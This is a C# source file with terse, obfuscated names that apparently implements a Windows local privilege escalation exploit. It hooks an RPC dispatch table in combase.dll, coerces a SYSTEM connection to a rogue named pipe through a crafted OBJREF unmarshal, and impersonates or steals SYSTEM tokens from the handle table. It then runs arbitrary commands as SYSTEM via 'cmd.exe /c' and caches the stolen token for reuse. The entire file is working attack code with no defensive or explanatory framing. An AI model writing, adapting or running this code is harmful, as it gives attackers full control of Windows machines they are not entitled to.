using System;
using System.IO;
using System.Text;
using System.Diagnostics;
using System.Threading;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Security.Principal;

public class X {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(IntPtr a, uint s, uint n, out uint o);
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern IntPtr CreateNamedPipeW(string n, uint o, uint p, uint m, uint ob, uint ib, uint t, IntPtr s);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ConnectNamedPipe(IntPtr h, IntPtr o);
    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint a, bool i, int p);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool DuplicateHandle(IntPtr sp, IntPtr sh, IntPtr tp, out IntPtr th, uint a, bool i, uint o);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool SetHandleInformation(IntPtr h, uint m, uint f);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CreatePipe(out IntPtr r, out IntPtr w, ref SA sa, int s);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool PeekNamedPipe(IntPtr h, byte[] b, uint bs, ref uint r, ref uint a, ref uint l);
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateNamedPipeClient(IntPtr h);
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool RevertToSelf();
    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern bool ConvertStringSecurityDescriptorToSecurityDescriptor(string s, uint r, out IntPtr sd, out uint sz);
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr p, uint a, out IntPtr t);
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool GetTokenInformation(IntPtr t, uint c, IntPtr i, uint l, out uint r);
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool DuplicateTokenEx(IntPtr t, uint a, IntPtr at, uint il, uint ty, out IntPtr n);
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcessAsUserW(IntPtr t, string ap, string cl, IntPtr pa, IntPtr ta, bool ih, uint f, IntPtr e, string d, ref SI si, out PI pi);
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcessWithTokenW(IntPtr t, uint l, string ap, string cl, uint f, IntPtr e, string d, ref SI si, out PI pi);
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern IntPtr GetSidSubAuthority(IntPtr s, uint n);
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern IntPtr GetSidSubAuthorityCount(IntPtr s);
    [DllImport("kernel32.dll")]
    public static extern uint WaitForSingleObject(IntPtr h, uint m);
    [DllImport("ntdll.dll")]
    public static extern uint NtQuerySystemInformation(uint c, IntPtr b, uint l, out uint r);
    [DllImport("ole32.dll")]
    public static extern int CoUnmarshalInterface(IStream s, ref Guid r, out IntPtr p);
    [DllImport("ole32.dll", PreserveSig = false)]
    public static extern int CreateBindCtx(uint r, out IBindCtx b);
    [DllImport("ole32.dll", CharSet = CharSet.Unicode, PreserveSig = false)]
    public static extern int CreateObjrefMoniker(IntPtr p, out IMoniker m);

    [StructLayout(LayoutKind.Sequential)]
    public struct SA { public int n; public IntPtr p; public bool b; }
    [StructLayout(LayoutKind.Sequential)]
    public struct SI {
        public int cb; public string r1, d, t;
        public int x, y, xs, ys, xc, yc, fa, fl;
        public short sw, r2; public IntPtr r3, hI, hO, hE;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct PI { public IntPtr hP, hT; public int p, t; }
    [StructLayout(LayoutKind.Sequential)]
    public struct RV { public ushort A, B; }
    [StructLayout(LayoutKind.Sequential)]
    public struct RS { public Guid G; public RV V; }
    [StructLayout(LayoutKind.Sequential)]
    public struct RI {
        public uint L; public RS Id, Xf;
        public IntPtr DT; public uint PC;
        public IntPtr PE, DM, II; public uint Fl;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct RD { public uint C; public IntPtr T; public int R; }
    [StructLayout(LayoutKind.Sequential)]
    public struct MS { public IntPtr SD, DT, PS, FO, TT, XS, NC, SI; }
    [StructLayout(LayoutKind.Sequential)]
    public struct HI { public IntPtr N, R; }
    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct HE {
        public IntPtr O, P, H;
        public uint A; public ushort B, T; public uint At, Rs;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct SDA { public IntPtr S; public uint A; }
    [StructLayout(LayoutKind.Sequential)]
    public struct TM { public SDA L; }

    public delegate int H4(IntPtr a, IntPtr b, IntPtr c, IntPtr d);
    public delegate int H5(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e);
    public delegate int H6(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f);
    public delegate int H7(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g);
    public delegate int H8(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h);

    public class SW : IStream {
        Stream s;
        public SW(Stream s) { this.s = s; }
        public void Read(byte[] pv, int cb, IntPtr pcb) {
            int n = s.Read(pv, 0, cb);
            if (pcb != IntPtr.Zero) Marshal.WriteInt32(pcb, n);
        }
        public void Write(byte[] pv, int cb, IntPtr pcb) {
            s.Write(pv, 0, cb);
            if (pcb != IntPtr.Zero) Marshal.WriteInt32(pcb, cb);
        }
        public void Seek(long o, int or2, IntPtr p) {
            s.Seek(o, (SeekOrigin)or2);
            if (p != IntPtr.Zero) Marshal.WriteInt64(p, s.Position);
        }
        public void Stat(out System.Runtime.InteropServices.ComTypes.STATSTG st, int f) {
            st = new System.Runtime.InteropServices.ComTypes.STATSTG(); st.cbSize = s.Length;
        }
        public void SetSize(long sz) { }
        public void CopyTo(IStream d, long cb, IntPtr r, IntPtr w) { }
        public void Commit(int f) { }
        public void Revert() { }
        public void LockRegion(long o, long c, int t) { }
        public void UnlockRegion(long o, long c, int t) { }
        public void Clone(out IStream r) { r = null; }
    }

    static object _lk = new object();
    static IntPtr _ct = IntPtr.Zero;
    static int _tt = -2;

    static Guid IU = new Guid("00000000-0000-0000-C000-000000000046");

    public static string Run(string cmd) {
        lock (_lk) {
            if (_ct != IntPtr.Zero) {
                try {
                    var w = new WindowsIdentity(_ct);
                    if (w.Name.Contains("SYSTEM"))
                        return "[*] Cached\n=== Output ===\n" + Exec(_ct, cmd);
                } catch { _ct = IntPtr.Zero; }
            }
            return Exploit(cmd);
        }
    }

    static string Exploit(string cmd) {
        var log = new StringWriter();
        string pn = Guid.NewGuid().ToString();
        string sp = @"\\.\pipe\" + pn + @"\pipe\epmapper";
        string cp = "ncacn_np:localhost/pipe/" + pn + @"[\pipe\epmapper]";

        IntPtr cb = IntPtr.Zero; int cs = 0;
        foreach (ProcessModule m in Process.GetCurrentProcess().Modules) {
            if (m.ModuleName != null && m.ModuleName.ToLower() == "combase.dll") {
                cb = m.BaseAddress; cs = m.ModuleMemorySize; break;
            }
        }
        if (cb == IntPtr.Zero) return "no combase";
        log.WriteLine("[*] combase: 0x{0:x}", cb.ToInt64());

        byte[] gb = new byte[] { 0x70, 0x07, 0xf7, 0x18, 0x64, 0x8e, 0xcf, 0x11,
                                 0x9a, 0xf1, 0x00, 0x20, 0xaf, 0x6e, 0x72, 0xf4 };
        var gu = new Guid(gb);

        byte[] db = new byte[cs];
        Marshal.Copy(cb, db, 0, cs);
        var pm = new MemoryStream();
        var pw = new BinaryWriter(pm);
        pw.Write(Marshal.SizeOf(typeof(RI)));
        pw.Write(gu.ToByteArray());
        pw.Flush();
        byte[] pat = pm.ToArray();

        int fa = -1;
        for (int i = 0; i <= db.Length - pat.Length; i++) {
            bool mt = true;
            for (int j = 0; j < pat.Length; j++) {
                if (db[i + j] != pat[j]) { mt = false; break; }
            }
            if (mt) { fa = i; break; }
        }
        if (fa < 0) return "not found";

        IntPtr ip = new IntPtr(cb.ToInt64() + fa);
        RI ri = (RI)Marshal.PtrToStructure(ip, typeof(RI));
        RD rd = (RD)Marshal.PtrToStructure(ri.DT, typeof(RD));
        MS ms = (MS)Marshal.PtrToStructure(ri.II, typeof(MS));
        IntPtr dt = ms.DT;
        IntPtr of = Marshal.ReadIntPtr(dt);
        uint pc = Marshal.ReadByte(ms.PS, Marshal.ReadInt16(ms.FO) + 19);
        log.WriteLine("[*] params={0}", pc);

        string cp2 = cp;
        Func<IntPtr, IntPtr, int> hf = (e2, f2) => {
            string[] eps = { cp2, "ncacn_ip_tcp:0.0.0.0" };
            int ec = 3;
            for (int i = 0; i < eps.Length; i++) ec += eps[i].Length + 1;
            int bsz = ec * 2 + 16;
            IntPtr buf = Marshal.AllocHGlobal(bsz);
            for (int i = 0; i < bsz; i++) Marshal.WriteByte(buf, i, 0);
            int off = 0;
            Marshal.WriteInt16(buf, off, (short)ec); off += 2;
            Marshal.WriteInt16(buf, off, (short)(ec - 2)); off += 2;
            for (int i = 0; i < eps.Length; i++) {
                for (int j = 0; j < eps[i].Length; j++) {
                    Marshal.WriteInt16(buf, off, (short)eps[i][j]); off += 2;
                }
                off += 2;
            }
            Marshal.WriteIntPtr(e2, buf);
            return 0;
        };

        Delegate hd = null;
        if (pc == 4) hd = new H4((a, b, c, d) => hf(c, d));
        else if (pc == 5) hd = new H5((a, b, c, d, e) => hf(d, e));
        else if (pc == 6) hd = new H6((a, b, c, d, e, f) => hf(e, f));
        else if (pc == 7) hd = new H7((a, b, c, d, e, f, g) => hf(f, g));
        else if (pc == 8) hd = new H8((a, b, c, d, e, f, g, h) => hf(g, h));
        else return "unsupported params: " + pc;

        uint op;
        VirtualProtect(dt, (uint)(IntPtr.Size * rd.C), 0x04, out op);
        Marshal.WriteIntPtr(dt, Marshal.GetFunctionPointerForDelegate(hd));
        log.WriteLine("[*] Hooked");

        IntPtr ct = IntPtr.Zero; string cu = null;
        try {
            var tr = new ManualResetEvent(false);
            var pt = new Thread(() => {
                IntPtr ph = (IntPtr)(-1);
                try {
                    IntPtr sd; uint ss;
                    ConvertStringSecurityDescriptorToSecurityDescriptor("D:(A;OICI;GA;;;WD)", 1, out sd, out ss);
                    IntPtr pa = Marshal.AllocHGlobal(24);
                    Marshal.WriteInt32(pa, 0, 24);
                    Marshal.WriteInt64(pa, 8, sd.ToInt64());
                    Marshal.WriteInt32(pa, 16, 0);
                    ph = CreateNamedPipeW(sp, 3, 0, 255, 521, 0, 123, pa);
                    if (ph == (IntPtr)(-1)) { log.WriteLine("[!] pipe fail"); return; }
                    log.WriteLine("[*] Pipe ready");
                    bool cn = ConnectNamedPipe(ph, IntPtr.Zero);
                    int ce = Marshal.GetLastWin32Error();
                    if (!cn && ce != 0x217) { log.WriteLine("[!] connect fail"); return; }
                    log.WriteLine("[*] Connected");
                    if (ImpersonateNamedPipeClient(ph)) {
                        var wi = WindowsIdentity.GetCurrent();
                        log.WriteLine("[*] {0} {1}", wi.Name, wi.ImpersonationLevel);
                        if (wi.ImpersonationLevel >= TokenImpersonationLevel.Impersonation) {
                            ct = FindTok(log);
                            if (ct != IntPtr.Zero) {
                                cu = new WindowsIdentity(ct).Name;
                                log.WriteLine("[*] Got: {0}", cu);
                            }
                        }
                        RevertToSelf();
                    }
                } catch (Exception ex) { log.WriteLine("[!] " + ex.Message); }
                finally { if (ph != (IntPtr)(-1)) CloseHandle(ph); tr.Set(); }
            });
            pt.IsBackground = true;
            pt.Start();
            Thread.Sleep(200);

            log.WriteLine("[*] Trigger");
            int hr = Trigger(log);
            log.WriteLine("[*] hr=0x{0:x}", hr);
            tr.WaitOne(15000);
        } finally {
            Marshal.WriteIntPtr(dt, of);
            log.WriteLine("[*] Restored");
            GC.KeepAlive(hd);
        }

        if (ct == IntPtr.Zero) return log + "\n[!] Failed";
        _ct = ct;
        return log + "\n=== Output ===\n" + Exec(ct, cmd);
    }

    static int Trigger(TextWriter log) {
        object fk = new object();
        IntPtr pu = Marshal.GetIUnknownForObject(fk);
        IBindCtx bc; CreateBindCtx(0, out bc);
        IMoniker mk; CreateObjrefMoniker(pu, out mk);
        string dn; mk.GetDisplayName(bc, null, out dn);
        string b6 = dn.Replace("objref:", "").Replace(":", "");
        byte[] ob = Convert.FromBase64String(b6);
        ulong ox = BitConverter.ToUInt64(ob, 32);
        ulong oi = BitConverter.ToUInt64(ob, 40);
        byte[] ib = new byte[16]; Array.Copy(ob, 48, ib, 0, 16);
        Guid ipid = new Guid(ib);
        log.WriteLine("[*] OXID=0x{0:x}", ox);

        var ms2 = new MemoryStream();
        var bw = new BinaryWriter(ms2);
        bw.Write((uint)0x574f454d); bw.Write((uint)1);
        bw.Write(IU.ToByteArray());
        bw.Write((uint)0); bw.Write((uint)1);
        bw.Write(ox); bw.Write(oi); bw.Write(ipid.ToByteArray());

        var s1 = new MemoryStream(); var w1 = new BinaryWriter(s1, Encoding.Unicode);
        w1.Write((ushort)7); w1.Write(Encoding.Unicode.GetBytes("127.0.0.1"));
        w1.Write((ushort)0); w1.Write((ushort)0); byte[] sb1 = s1.ToArray();

        var s2 = new MemoryStream(); var w2 = new BinaryWriter(s2, Encoding.Unicode);
        w2.Write((ushort)0x0a); w2.Write((ushort)0xffff);
        w2.Write((ushort)0); w2.Write((ushort)0); byte[] sb2 = s2.ToArray();

        bw.Write((ushort)((sb1.Length + sb2.Length) / 2));
        bw.Write((ushort)(sb1.Length / 2));
        bw.Write(sb1); bw.Write(sb2);

        IntPtr ppv; Guid iu2 = IU;
        int hr2 = CoUnmarshalInterface(new SW(new MemoryStream(ms2.ToArray())), ref iu2, out ppv);
        Marshal.Release(pu);
        return hr2;
    }

    static int DetTT() {
        int pid = Process.GetCurrentProcess().Id;
        IntPtr mt = WindowsIdentity.GetCurrent().Token;
        IntPtr buf = IntPtr.Zero; uint sz = 1024 * 1024, ret;
        try {
            while (true) {
                buf = Marshal.AllocHGlobal((int)sz);
                uint st = NtQuerySystemInformation(0x40, buf, sz, out ret);
                if (st == 0) break;
                Marshal.FreeHGlobal(buf); buf = IntPtr.Zero;
                if (st == 0xc0000004) { sz *= 2; continue; }
                return -1;
            }
            long cnt = Marshal.ReadIntPtr(buf).ToInt64();
            int hs = Marshal.SizeOf(typeof(HI));
            int es = Marshal.SizeOf(typeof(HE));
            for (long i = 0; i < cnt; i++) {
                IntPtr p = new IntPtr(buf.ToInt64() + hs + es * i);
                HE e = (HE)Marshal.PtrToStructure(p, typeof(HE));
                if (e.P.ToInt64() == pid && e.H == mt) return e.T;
            }
        } finally { if (buf != IntPtr.Zero) Marshal.FreeHGlobal(buf); }
        return -1;
    }

    static IntPtr FindTok(TextWriter log) {
        if (_tt == -2) _tt = DetTT();
        if (_tt < 0) return FindTokSimple(log);
        IntPtr buf = IntPtr.Zero; uint sz = 4 * 1024 * 1024, ret;
        try {
            while (true) {
                buf = Marshal.AllocHGlobal((int)sz);
                uint st = NtQuerySystemInformation(0x40, buf, sz, out ret);
                if (st == 0) break;
                Marshal.FreeHGlobal(buf); buf = IntPtr.Zero;
                if (st == 0xc0000004) { sz *= 2; continue; }
                return FindTokSimple(log);
            }
            long cnt = Marshal.ReadIntPtr(buf).ToInt64();
            int hs = Marshal.SizeOf(typeof(HI));
            int es = Marshal.SizeOf(typeof(HE));
            IntPtr lp = GetCurrentProcess(); IntPtr ph = IntPtr.Zero; int lpi = -1;
            for (long i = 0; i < cnt; i++) {
                IntPtr ep = new IntPtr(buf.ToInt64() + hs + es * i);
                HE e = (HE)Marshal.PtrToStructure(ep, typeof(HE));
                int epid = (int)e.P.ToInt64();
                if (e.T != _tt || e.A == 0x0012019f) continue;
                if (epid != lpi) {
                    if (ph != IntPtr.Zero) { CloseHandle(ph); ph = IntPtr.Zero; }
                    ph = OpenProcess(0x0440, false, epid);
                    if (ph == IntPtr.Zero) { lpi = epid; continue; }
                    IntPtr pt2;
                    if (OpenProcessToken(ph, 0x000E, out pt2)) {
                        if (IsSys(pt2)) {
                            log.WriteLine("[*] tok PID={0}", epid);
                            if (ph != IntPtr.Zero) CloseHandle(ph);
                            return pt2;
                        }
                        CloseHandle(pt2);
                    }
                    lpi = epid;
                }
                if (ph == IntPtr.Zero) continue;
                IntPtr dh;
                if (DuplicateHandle(ph, e.H, lp, out dh, 0xE0000000 | 0x0008, false, 0)) {
                    if (IsSys(dh)) {
                        log.WriteLine("[*] tok PID={0} H=0x{1:x}", epid, e.H.ToInt64());
                        if (ph != IntPtr.Zero) CloseHandle(ph);
                        return dh;
                    }
                    CloseHandle(dh);
                }
            }
            if (ph != IntPtr.Zero) CloseHandle(ph);
        } finally { if (buf != IntPtr.Zero) Marshal.FreeHGlobal(buf); }
        return FindTokSimple(log);
    }

    static IntPtr FindTokSimple(TextWriter log) {
        foreach (Process p in Process.GetProcesses()) {
            try {
                IntPtr hp = OpenProcess(0x0400, false, p.Id);
                if (hp == IntPtr.Zero) continue;
                IntPtr ht;
                if (OpenProcessToken(hp, 0x000E, out ht)) {
                    if (IsSys(ht)) { CloseHandle(hp); return ht; }
                    CloseHandle(ht);
                }
                CloseHandle(hp);
            } catch { }
        }
        return IntPtr.Zero;
    }

    static bool IsSys(IntPtr t) {
        uint len;
        if (!GetTokenInformation(t, 1, IntPtr.Zero, 0, out len) && len == 0) return false;
        IntPtr info = Marshal.AllocHGlobal((int)len);
        try {
            if (!GetTokenInformation(t, 1, info, len, out len)) return false;
            IntPtr sp = Marshal.ReadIntPtr(info);
            SecurityIdentifier sid;
            try { sid = new SecurityIdentifier(sp); } catch { return false; }
            if (sid.Value != "S-1-5-18") return false;
        } finally { Marshal.FreeHGlobal(info); }

        uint il;
        if (!GetTokenInformation(t, 9, IntPtr.Zero, 0, out il) && il == 0) return true;
        IntPtr ii = Marshal.AllocHGlobal((int)il);
        try {
            if (!GetTokenInformation(t, 9, ii, il, out il)) return true;
            int v = Marshal.ReadInt32(ii);
            var lv = (TokenImpersonationLevel)(v + 1);
            if (lv >= TokenImpersonationLevel.Impersonation) return true;
        } finally { Marshal.FreeHGlobal(ii); }

        IntPtr dp;
        if (DuplicateTokenEx(t, 0x000E, IntPtr.Zero, 2, 2, out dp)) { CloseHandle(dp); return true; }
        return false;
    }

    static string Exec(IntPtr t, string cmd) {
        IntPtr dt2;
        if (!DuplicateTokenEx(t, 0x000F01FF, IntPtr.Zero, 2, 1, out dt2))
            if (!DuplicateTokenEx(t, 0x02000000, IntPtr.Zero, 2, 1, out dt2))
                return "dup fail: " + Marshal.GetLastWin32Error();

        IntPtr hr2, hw;
        SA sa = new SA(); sa.n = Marshal.SizeOf(typeof(SA)); sa.b = true;
        if (!CreatePipe(out hr2, out hw, ref sa, 8192)) return "pipe fail";
        SetHandleInformation(hr2, 1, 1);
        SetHandleInformation(hw, 1, 1);

        SI si = new SI(); si.cb = Marshal.SizeOf(typeof(SI));
        si.hE = hw; si.hO = hw; si.hI = IntPtr.Zero; si.fl = 0x100;

        PI pi; string cl = "cmd.exe /c " + cmd;
        bool cr = CreateProcessAsUserW(dt2, null, cl, IntPtr.Zero, IntPtr.Zero, true, 0x08000000, IntPtr.Zero, null, ref si, out pi);
        if (!cr) cr = CreateProcessWithTokenW(dt2, 0, null, cl, 0x08000000, IntPtr.Zero, null, ref si, out pi);
        CloseHandle(dt2);
        if (!cr) return "create fail: " + Marshal.GetLastWin32Error();
        CloseHandle(hw);
        WaitForSingleObject(pi.hP, 30000);

        var ou = new StringBuilder();
        var fs = new FileStream(hr2, FileAccess.Read, false);
        byte[] rb = new byte[4096]; uint br2 = 0, ba = 0, bl = 0;
        while (true) {
            if (!PeekNamedPipe(hr2, rb, (uint)rb.Length, ref br2, ref ba, ref bl)) break;
            if (ba > 0) { int n = fs.Read(rb, 0, rb.Length); ou.Append(Encoding.Default.GetString(rb, 0, n)); }
            else break;
        }
        fs.Close();
        CloseHandle(pi.hP); CloseHandle(pi.hT); CloseHandle(hr2);
        return ou.ToString();
    }
}
